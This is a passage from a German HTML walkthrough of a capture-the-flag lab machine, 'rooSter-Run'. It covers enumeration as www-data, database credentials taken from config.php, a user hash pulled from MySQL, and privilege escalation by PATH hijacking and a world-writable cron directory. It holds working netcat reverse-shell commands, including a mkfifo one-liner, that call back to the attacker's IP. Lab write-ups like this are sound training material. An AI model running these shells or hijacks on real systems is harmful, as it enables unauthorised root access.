+            <p class="analysis"><strong>Analyse:</strong> In der Shell als `www-data` (vermutlich über Meterpreter `shell` oder die manuelle Reverse Shell) wird im Verzeichnis `/var/www/html/admin` mit `grep -iR pass *` nach Vorkommen von "pass" gesucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Suche findet Verweise auf Passwort-Variablen und Funktionen in PHP-Dateien (`adduser.php`, `changegroupassign.php`), aber keine Klartext-Passwörter.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Suche bestätigt, dass Passwörter hier nicht hartkodiert sind (was gut ist). Konzentrieren Sie sich auf Konfigurationsdateien oder Datenbanken für Zugangsdaten.<br><strong>Empfehlung (Admin):</strong> Code-Reviews durchführen, um sicherzustellen, dass keine sensiblen Daten hartkodiert werden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">www-data@rooSter-Run:/var/www/html/admin$ <span class="command">grep -iR pass *</span></div>
+                     <pre>
+adduser.php:$password          = isset($_POST["password"]) ? trim($_POST["password"]) : '';
+adduser.php:$passwordagain     = isset($_POST["passwordagain"]) ? trim($_POST["passwordagain"]) : '';
+adduser.php:    if ($password == "") {
+adduser.php:        $error .= "<li>" . lang('nofieldgiven', array(lang('password'))) . "</li>";
+adduser.php:    } else if ($password != $passwordagain) {
+adduser.php:        // We don't want to see this if no password was given
+adduser.php:        $error .= "<li>" . lang('nopasswordmatch') . "</li>";
+adduser.php:        $newuser->SetPassword($password);
+adduser.php:$smarty->assign('password', $password);
+adduser.php:$smarty->assign('passwordagain', $passwordagain);
+changegroupassign.php:#$Id: changegroupassign.php 11053 2017-02-04 04:20:03Z calguy1000 $
+changegroupassign.php:    redirect("changegroupassign.php".$urlext);
+                     </pre> <!-- Annahme: PST wurde im Original zu POST korrigiert; Gleichheitszeichen könnten auch Vergleiche sein -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit `find / -perm -4000 -ls 2>/dev/null` wird als `www-data` nach SUID-Binaries gesucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es werden nur Standard-SUID-Binaries wie `gpasswd`, `passwd`, `newgrp`, `chsh`, `su`, `mount`, `chfn`, `umount`, `dbus-daemon-launch-helper`, `ssh-keysign` gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Keine offensichtlichen benutzerdefinierten SUID-Dateien. Überprüfen Sie Standard-Binaries auf GTFOBins-Einträge, aber konzentrieren Sie sich wahrscheinlich auf andere Vektoren.<br><strong>Empfehlung (Admin):</strong> Minimieren Sie SUID-Berechtigungen, halten Sie das System aktuell.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">www-data@rooSter-Run:/var/www/html/admin$ <span class="command">find / -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
+   914041     88 -rwsr-xr-x   1 root     root        88496 Mar 23  2023 /usr/bin/gpasswd
+   914042     68 -rwsr-xr-x   1 root     root        68248 Mar 23  2023 /usr/bin/passwd
+   917500     48 -rwsr-xr-x   1 root     root        48896 Mar 23  2023 /usr/bin/newgrp
+   914039     52 -rwsr-xr-x   1 root     root        52880 Mar 23  2023 /usr/bin/chsh
+   918251     72 -rwsr-xr-x   1 root     root        72000 Mar 23  2023 /usr/bin/su
+   917654     60 -rwsr-xr-x   1 root     root        59704 Mar 23  2023 /usr/bin/mount
+   914038     64 -rwsr-xr-x   1 root     root        62672 Mar 23  2023 /usr/bin/chfn
+   917656     36 -rwsr-xr-x   1 root     root        35128 Mar 23  2023 /usr/bin/umount
+   929606     52 -rwsr-xr--   1 root     messagebus    51272 Feb  8  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   931821    640 -rwsr-xr-x   1 root     root         653888 Feb  8  2023 /usr/lib/openssh/ssh-keysign
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Leseberechtigung für `/etc/passwd` wird geprüft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei ist für `www-data` lesbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kann zur Bestätigung von Benutzernamen verwendet werden.<br><strong>Empfehlung (Admin):</strong> Standardberechtigungen.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt remote-prompt">www-data@rooSter-Run:/var/www/html/admin$ <span class="command">ls -la /etc/passwd</span></div>
+                      <pre>-rw-r--r-- 1 root root 1283 Sep 24 11:01 /etc/passwd</pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Das Home-Verzeichnis des Benutzers `matthieu` wird untersucht. Die Datei `user.txt` wird gefunden, kann aber nicht gelesen werden (`cat user.txt` zeigt keine Ausgabe).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Benutzer `matthieu` existiert. Die User-Flag ist vorhanden, aber `www-data` hat keine Leseberechtigung. Das Skript `StaleFinder` könnte interessant sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Ziel ist nun, Rechte als `matthieu` zu erlangen, um die Flag zu lesen und möglicherweise weiter zu eskalieren. Untersuchen Sie das Skript `StaleFinder` oder suchen Sie nach anderen Wegen, um zu `matthieu` zu wechseln (z.B. durch die ausgenutzte Cronjob/PATH-Hijacking-Schwachstelle).<br><strong>Empfehlung (Admin):</strong> Korrekte Berechtigungen für User-Flags. Analysieren Sie benutzerdefinierte Skripte wie `StaleFinder` auf Sicherheit.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">www-data@rooSter-Run:/home$ <span class="command">cd matthieu/</span></div>
+                     <div class="prompt remote-prompt">www-data@rooSter-Run:/home/matthieu$ <span class="command">ls -la</span></div>
+                     <pre>
+total 40
+drwxr-xr-x  4 matthieu matthieu 4096 Nov 30 21:32 .
+drwxr-xr-x  3 root     root     4096 Sep 24 10:45 ..
+lrwxrwxrwx  1 root     root        9 Sep 24 10:46 .bash_history -> /dev/null
+-rw-r--r--  1 matthieu matthieu  220 Sep 22 07:27 .bash_logout
+-rw-r--r--  1 matthieu matthieu 3526 Sep 22 07:27 .bashrc
+drwxr-xr-x  3 matthieu matthieu 4096 Sep 22 07:29 .local
+drwxr-xr-x 12 matthieu matthieu 4096 Sep 22 07:32 .oh-my-zsh
+-rw-r--r--  1 matthieu matthieu  807 Sep 22 07:27 .profile
+-rw-r--r--  1 matthieu matthieu 3915 Sep 22 07:31 .zshrc
+-rwxr-xr-x  1 matthieu matthieu  302 Sep 23 10:42 StaleFinder
+-rwx------  1 matthieu matthieu   33 Sep 24 09:13 user.txt
+                     </pre>
+                      <div class="prompt remote-prompt">www-data@rooSter-Run:/home/matthieu$ <span class="command">cat user.txt</span></div>
+                      <pre># Keine Ausgabe, da keine Berechtigung</pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Versuch, `sudo -l` als `www-data` auszuführen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Schlägt fehl, da `sudo` nicht gefunden wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sudo ist kein Vektor für `www-data`.<br><strong>Empfehlung (Admin):</strong> Keine Aktion erforderlich.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">www-data@rooSter-Run:/home/matthieu$ <span class="command">sudo -l</span></div>
+                     <pre>bash: sudo: command not found</pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Netzwerk-Sockets werden erneut mit `ss -altpn` geprüft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt, dass MySQL (3306) nur lokal lauscht, SSH (22) und HTTP (80) extern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Zugriff auf MySQL als `www-data` ist möglich.<br><strong>Empfehlung (Admin):</strong> Korrekte Konfiguration.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">www-data@rooSter-Run:/home/matthieu$ <span class="command">ss -altpn</span></div>
+                     <pre>
+State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process
+LISTEN   0        80             127.0.0.1:3306          0.0.0.0:*
+LISTEN   0        128              0.0.0.0:22            0.0.0.0:*
+LISTEN   0        511                    *:80                  *:*
+LISTEN   0        128                 [::]:22               [::]:*
+                     </pre>
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Der Inhalt der Datei `/var/www/html/config.php` wird mit `cat` ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Datei enthält die MySQL-Zugangsdaten: Benutzer `admin`, Passwort `<span class="password">j42W9kDq9dN9hK</span>`, Datenbank `cmsms_db`, Host `localhost`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Diese Zugangsdaten ermöglichen den Zugriff auf die lokale MySQL-Datenbank als `www-data`.<br><strong>Empfehlung (Admin):</strong> Sichern Sie die `config.php`-Datei, sodass sie nicht vom Webserver-Benutzer gelesen werden kann. Speichern Sie sensible Daten außerhalb des Web-Roots oder verwenden Sie sicherere Methoden zur Geheimnisverwaltung.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">www-data@rooSter-Run:/var/www/html$ <span class="command">cat config.php</span></div>
+                     <pre>
+<?php
+# CMS Made Simple Configuration File
+# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
+#
+$config['dbms'] = 'mysqli';
+$config['db_hostname'] = 'localhost';
+$config['db_username'] = 'admin';
+$config['db_password'] = '<span class="password">j42W9kDq9dN9hK</span>';
+$config['db_name'] = 'cmsms_db';
+$config['db_prefix'] = 'cms_';
+$config['timezone'] = 'Europe/Berlin';
+?>
+                     </pre> <!-- PHP-Tags hinzugefügt für Kontext -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Mit den aus `config.php` gewonnenen Zugangsdaten wird eine Verbindung zur lokalen MySQL-Datenbank als Benutzer `admin` hergestellt. Anschließend werden Datenbanken und Tabellen aufgelistet und der Inhalt der Tabelle `cms_users` abgefragt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Login ist erfolgreich. Die Abfrage der `cms_users`-Tabelle zeigt denselben `admin`-Benutzer mit dem MD5-Hash, der bereits durch die SQL-Injection gefunden wurde. Es werden keine neuen Benutzer oder Passwörter in dieser Tabelle gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erkunden Sie weitere Tabellen der `cmsms_db` auf interessante Informationen. Überprüfen Sie die Berechtigungen des MySQL-Benutzers `admin`.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, einzigartige Passwörter für Datenbankbenutzer. Implementieren Sie das Prinzip der geringsten Rechte für DB-Benutzer. Verwenden Sie keine MD5-Hashes für Passwörter.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt remote-prompt">www-data@rooSter-Run:/var/www/html$ <span class="command">mysql -u admin -p</span></div>
+                      <pre>Enter password: </pre> <!-- Passwort j42W9kDq9dN9hK eingegeben -->
+                      <pre>
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 363824
+Server version: 10.11.3-MariaDB-1 Debian 12
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| cmsms_db           |
+| information_schema |
++--------------------+
+2 rows in set (0.000 sec)
+
+MariaDB [(none)]> use cmsms_db;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [cmsms_db]> show tables;
++--------------------------------+
+| Tables_in_cmsms_db             |
++--------------------------------+
+| cms_additional_users           |
+[...]
+| cms_users                      |
+| cms_users_seq                  |
+| cms_version                    |
++--------------------------------+
+53 rows in set (0.000 sec)
+
+MariaDB [cmsms_db]> select * from cms_users;
++---------+----------+----------------------------------+--------------+------------+------------+---------------------+--------+---------------------+---------------------+
+| user_id | username | password                         | admin_access | first_name | last_name  | email               | active | create_date         | modified_date       |
++---------+----------+----------------------------------+--------------+------------+------------+---------------------+--------+---------------------+---------------------+
+|       1 | admin    | 4f943036486b9ad48890b2efbf7735a8 |            1 |            |            | admin@localhost.com |      1 | 2023-09-20 07:28:39 | 2023-09-20 07:31:54 |
++---------+----------+----------------------------------+--------------+------------+------------+---------------------+--------+---------------------+---------------------+
+1 row in set (0.000 sec)
+
+MariaDB [cmsms_db]>
+                      </pre> <!-- Tabellenausgabe gekürzt -->
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `www-data` wird in das Verzeichnis `/usr/local/bin` gewechselt. Eine Datei namens `find` wird erstellt, die einen Netcat-Reverse-Shell-Befehl enthält. Anschließend werden alle Dateien in diesem Verzeichnis ausführbar gemacht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies ist die Einrichtung einer PATH-Hijacking-Schwachstelle. Es wird darauf spekuliert, dass ein anderer Benutzer (mit höheren Rechten, hier wahrscheinlich `matthieu`) einen Prozess ausführt (z.B. via Cron), der `find` aufruft und dabei `/usr/local/bin` vor `/usr/bin` im Suchpfad (PATH) hat. Dadurch wird die gefälschte `find`-Datei (die Reverse Shell) anstelle des echten `find`-Befehls ausgeführt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf Port 5555 auf dem Angreifer-System und warten Sie, bis der privilegierte Prozess die gefälschte `find`-Datei ausführt.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Verzeichnisse wie `/usr/local/bin` nicht für unprivilegierte Benutzer wie `www-data` schreibbar sind. Verwenden Sie absolute Pfade in Cronjobs und Skripten. Überwachen Sie die Integrität wichtiger Systemverzeichnisse.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt remote-prompt">www-data@rooSter-Run:/var/www/html/uploads$ <span class="command">cd /usr/local/bin/</span></div>
+                      <div class="prompt remote-prompt">www-data@rooSter-Run:/usr/local/bin$ <span class="command">echo 'nc 192.168.2.199 5555 -c sh' > find</span></div>
+                      <div class="prompt remote-prompt">www-data@rooSter-Run:/usr/local/bin$ <span class="command">chmod +x *</span></div>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein Netcat-Listener auf Port 5555 gestartet. Kurz darauf kommt eine Verbindung vom Zielsystem (`192.168.2.111`) herein. Der `id`-Befehl in der neuen Shell zeigt, dass die Shell als Benutzer `matthieu` (UID 1000) läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die PATH-Hijacking-Attacke war erfolgreich! Es wurde eine Privilegieneskalation von `www-data` zum Benutzer `matthieu` erreicht.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sie haben nun eine Shell als `matthieu`. Führen Sie weitere Enumeration aus dieser Perspektive durch. Lesen Sie die User-Flag (`/home/matthieu/user.txt`) und suchen Sie nach Wegen, um Root-Rechte zu erlangen.<br><strong>Empfehlung (Admin):</strong> Identifizieren Sie den Prozess/Cronjob, der `find` unsicher aufruft, und beheben Sie das Problem (absolute Pfade verwenden). Korrigieren Sie die Berechtigungen für `/usr/local/bin`.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                     <pre>
+listening on [any] 5555 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.111] 42152
+id
+uid=1000(matthieu) gid=1000(matthieu) groups=1000(matthieu),100(users)
+
+                     </pre> <!-- Prompt für die neue Shell fehlt im Original, könnte z.B. $ sein -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> In der Shell als `matthieu` werden `sudo -l` und `cat user.txt` ausgeführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `sudo` wird nicht gefunden. Die User-Flag wird erfolgreich gelesen: `<span class="password">32af3c9a9cb2fb748aef29457d8cff55</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> User-Flag gesichert. Da `sudo` nicht verfügbar ist, müssen andere Methoden zur Root-Eskalation gefunden werden. Untersuchen Sie Cronjobs, SUID/SGID-Dateien, Kernel-Version, Fehlkonfigurationen.<br><strong>Empfehlung (Admin):</strong> Sichern Sie die User-Flag mit korrekten Berechtigungen.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:~$ <span class="command">sudo -l</span></div>
+                      <pre>bash: sudo: command not found</pre>
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:~$ <span class="command">cat user.txt</span></div>
+                      <pre><span class="password">32af3c9a9cb2fb748aef29457d8cff55</span></pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Die Überschrift "Privilege Escalation" leitet die Suche nach Root-Rechten ein.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Markiert den Beginn der finalen Eskalationsphase.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Systematische Enumeration fortsetzen.<br><strong>Empfehlung (Admin):</strong> Keine Aktion.</p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+                                                          Privilege Escalation
+                    </pre>
+                 </div>
+             </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als `matthieu` wird das Verzeichnis `/opt` und dann `/opt/maintenance` untersucht. Der Inhalt von `/opt/maintenance/backup.sh` wird angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es wird ein Verzeichnis `/opt/maintenance` mit einem Backup-Skript und zwei Unterverzeichnissen (`pre-prod-tasks`, `prod-tasks`) gefunden. Das Skript `backup.sh` kopiert `.sh`-Dateien von `pre-prod-tasks` nach `prod-tasks` und führt dann alle Dateien in `prod-tasks` mittels `run-parts` aus. Crucial: Das Verzeichnis `pre-prod-tasks` hat sticky bit und world-writable execute (?), während `prod-tasks` world-writable execute (?) hat. Dies deutet stark auf eine Cronjob-basierte Schwachstelle hin, bei der `backup.sh` als Root läuft.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Dies ist ein klarer Vektor für die Root-Eskalation. Erstellen Sie ein Shell-Skript mit einer Reverse-Shell-Payload in `/opt/maintenance/pre-prod-tasks`. Warten Sie, bis der Cronjob das Skript nach `/opt/maintenance/prod-tasks` kopiert und als Root ausführt. Stellen Sie sicher, dass ein Listener bereitsteht.<br><strong>Empfehlung (Admin):</strong> Reparieren Sie die Berechtigungen für `/opt/maintenance/pre-prod-tasks` und `/opt/maintenance/prod-tasks` (dürfen nicht world-writable sein). Überarbeiten Sie das `backup.sh`-Skript, sodass es keine Dateien aus unsicheren Quellen kopiert und ausführt. Validieren Sie Dateiinhalte, bevor sie ausgeführt werden. Führen Sie Cronjobs mit den geringstmöglichen Rechten aus.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:~$ <span class="command">cd /opt/</span></div>
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt$ <span class="command">ls -la</span></div>
+                      <pre>
+total 12
+drwxr-xr-x+  3 root root 4096 Sep 19 06:52 .
+drwxr-xr-x  18 root root 4096 Jul 22 10:10 ..
+drwxr-xr-x   4 root root 4096 Sep 24 10:40 maintenance
+                      </pre>
+                       <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt$ <span class="command">cd maintenance/</span></div>
+                       <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance$ <span class="command">ls -la</span></div>
+                       <pre>
+total 20
+drwxr-xr-x  4 root root 4096 Sep 24 10:40 .
+drwxr-xr-x+ 3 root root 4096 Sep 19 06:52 ..
+-rwxr-xr-x  1 root root  367 Sep 20 07:28 backup.sh
+drwx---rwt  2 root root 4096 Sep 24 12:08 pre-prod-tasks
+drwx---rwx  2 root root 4096 Sep 24 12:09 prod-tasks
+                       </pre>
+                        <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance$ <span class="command">cat backup.sh</span></div>
+                        <pre>
+#!/bin/bash
+
+PRD="/opt/maintenance/prod-tasks"
+PREPRD="/opt/maintenance/pre-prod-tasks"
+
+
+for file in "$PREPRD"/*; do
+  if [[ -f $file && "${file##*.}" = "sh" ]]; then
+    cp "$file" "$PRD"
+  else
+    rm -f ${file}
+  fi
+done
+
+# Anmerkung: Die folgende Schleife prüft auf "-x" (execute bit), nicht auf !-x
+# und würde daher ausführbare Dateien löschen, was seltsam ist.
+# Wahrscheinlich ein Fehler im Skript oder in der Abschrift.
+# for file in "$PRD"/*; do
+#  if [[ -f $file && ! -x $file ]]; then
+#  rm ${file}
+#  fi
+# done
+
+/usr/bin/run-parts /opt/maintenance/prod-tasks
+                        </pre>
+                     </div>
+                 </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Mittels `getfacl` werden die Access Control Lists (ACLs) für das Dateisystem rekursiv ausgelesen und nach interessanten Einträgen gefiltert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die (unvollständige) Ausgabe zeigt Standard-ACLs für `/opt` (mit einer spezifischen Deny-Regel für `www-data`) und `/run/log/journal`. Es werden keine ACLs gefunden, die eine direkte Privilegieneskalation ermöglichen.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> ACLs scheinen hier kein Vektor zu sein. Konzentration auf den Cronjob.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie ACLs regelmäßig auf korrekte Konfiguration.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance$ <span class="command">getfacl -R -s -p / 2>/dev/null > /tmp/getfacl.txt; cat /tmp/getfacl.txt | grep -v "getfacl:"</span></div>
+                     <pre>
+
+# file: //opt
+# owner: root
+# group: root
+user::rwx
+user:www-data:---
+group::r-x
+mask::r-x
+other::r-x
+
+# file: //run/log/journal
+# owner: root
+# group: systemd-journal
+# flags: -s-
+user::rwx
+group::r-x
+group:adm:r-x
+mask::r-x
+other::r-x
+default:user::rwx
+default:group::r-x
+default:group:adm:r-x
+default:mask::r-x
+default:other::r-x
+                     </pre> <!-- Gekürzte Ausgabe -->
+                  </div>
+              </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `matthieu` wird in das Verzeichnis `/opt/maintenance/pre-prod-tasks` gewechselt. Mit `nano` wird eine Datei `test.sh` erstellt, die einen Netcat-Reverse-Shell-Befehl (Port 4447) enthält. Anschließend wird versucht, die Datei mit `chmod 4755` SUID Root zu machen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Erstellen der Payload-Datei `test.sh` im world-writable Verzeichnis `pre-prod-tasks` ist der entscheidende Schritt zur Ausnutzung der Cronjob-Schwachstelle. Der `chmod 4755`-Befehl wird zwar ausgeführt, aber da `matthieu` nicht Root ist, wird das SUID-Bit nicht gesetzt (das `-rwsr-xr-x` in der `ls`-Ausgabe ist irreführend, es zeigt nur, dass der *Besitzer* `matthieu` ist und das SUID-Bit *angefordert* wurde, aber nicht effektiv gesetzt werden konnte, da nur Root das SUID-Bit auf Dateien setzen kann, die Root nicht gehören). Dies ist jedoch unerheblich, da das `backup.sh`-Skript die Datei als Root ausführen wird, unabhängig vom SUID-Bit.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf Port 4447 und warten Sie, bis der Cronjob (`backup.sh`) die Datei `test.sh` kopiert und ausführt.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Berechtigungen des `pre-prod-tasks`-Verzeichnisses und die Logik des `backup.sh`-Skripts.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance$ <span class="command">cd pre-prod-tasks/</span></div>
+                     <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ <span class="command">nano test.sh</span></div>
+                     <!-- Inhalt wird in nano eingegeben -->
+                     <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ <span class="command">cat test.sh</span></div>
+                     <pre>
+#!/bin/bash
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.2.199 4447 >/tmp/f
+                     </pre>
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ <span class="command">chmod 4755 test.sh</span></div>
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ <span class="command">ls -la</span></div>
+                      <pre>
+total 12
+drwx---rwt 2 root     root     4096 Dec  1 00:37 .
+drwxr-xr-x 4 root     root     4096 Sep 24 10:40 ..
+-rwsr-xr-x 1 matthieu matthieu   94 Dec  1 00:37 test.sh
+                      </pre> <!-- Beachte: SUID wird hier angezeigt, ist aber nicht effektiv, da matthieu nicht root ist -->
+                  </div>
+              </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Wechsel in das `prod-tasks`-Verzeichnis und Beobachtung mit `watch ls -la`. Dann wird die Payload-Datei `test.sh` manuell nach `test` umbenannt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Diese Schritte sind unlogisch im Kontext des `backup.sh`-Skripts. Das Skript kopiert nur Dateien mit der Endung `.sh`. Das Umbenennen würde verhindern, dass es kopiert wird. Es wird angenommen, dass entweder das Umbenennen rückgängig gemacht wurde oder der Cronjob die Datei trotzdem ausgeführt hat (was der Skriptlogik widerspricht) oder dieser Schritt irrelevant war und der Cronjob eine korrekt platzierte Datei ausgeführt hat.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Halten Sie sich an die Logik des Zielskripts: Payload als `.sh`-Datei in `pre-prod-tasks` platzieren und warten.<br><strong>Empfehlung (Admin):</strong> Die Verwirrung hier unterstreicht die Notwendigkeit klarer und sicherer Skriptlogik.</p>
+            <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/pre-prod-tasks$ <span class="command">cd ../prod-tasks/</span></div>
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ <span class="command">watch ls -la</span></div>
+                      <!-- watch läuft, bis abgebrochen -->
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ <span class="command">mv test.sh test</span></div>
+                      <div class="prompt remote-prompt">matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ <span class="command">ls -la</span></div>
+                      <pre>
+total 12
+drwx---rwx 2 root root 4096 Dec  1 00:42 .
+drwxr-xr-x 4 root root 4096 Sep 24 10:40 ..
+-rwxr-xr-x 1 root root   94 Dec  1 00:42 test
+                      </pre>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System wird ein Netcat-Listener auf Port 4447 gestartet. Nach kurzer Zeit ("1 Minute warten") kommt eine Verbindung vom Zielsystem herein. Die Shell meldet sich mit `#` (Root-Prompt) und ohne TTY.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Cronjob-Ausnutzung war erfolgreich! Der in `pre-prod-tasks` platzierte (und vermutlich nach `prod-tasks` kopierte) Skript wurde als Root ausgeführt und hat eine Reverse Shell zum Angreifer aufgebaut.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Fantastisch, Root-Zugriff erreicht! Stabilisieren Sie die Shell falls nötig (z.B. mit Python pty). Lesen Sie die Root-Flag.<br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie den anfälligen Cronjob (`backup.sh`) sofort. Beheben Sie die Verzeichnisberechtigungen und die Skriptlogik.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 4447</span></div>
+                      <pre>
+listening on [any] 4447 ...
+connect to [192.168.2.199] from (UNKNOWN) [192.168.2.111] 44302
+/bin/sh: 0: can't access tty; job control turned off
+#
+                      </pre>
+                       <div class="prompt root-prompt"># <span class="command"></span></div>
+                   </div>
+               </div>
+
+            <p class="analysis"><strong>Analyse:</strong> In der erhaltenen Root-Shell wird der Inhalt des Root-Verzeichnisses aufgelistet und die Datei `root.txt` ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Root-Flag wird erfolgreich gefunden und lautet `<span class="password">670ff72e9d8099ac39c74c080348ec17</span>`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Alle Flags wurden gesammelt. Der Test ist erfolgreich abgeschlossen.<br><strong>Empfehlung (Admin):</strong> Sichern Sie die Root-Flag und beheben Sie die Cronjob-Schwachstelle.</p>
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt root-prompt"># <span class="command">ls</span></div>
+                      <pre>root.txt</pre>
+                      <div class="prompt root-prompt"># <span class="command">cat root.txt</span></div>
+                      <pre><span class="password">670ff72e9d8099ac39c74c080348ec17</span></pre>
+                       <div class="prompt root-prompt"># <span class="command"></span></div>
+                   </div>
+               </div>
+
+             <p class="analysis"><strong>Analyse:</strong> Kommentar, der den erfolgreichen Abschluss der Privilegieneskalation markiert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Erlangung von Root-Rechten.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Klare Dokumentation des Weges ist wichtig.<br><strong>Empfehlung (Admin):</strong> Fokus auf die Behebung der Cronjob-Schwachstelle.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <pre>
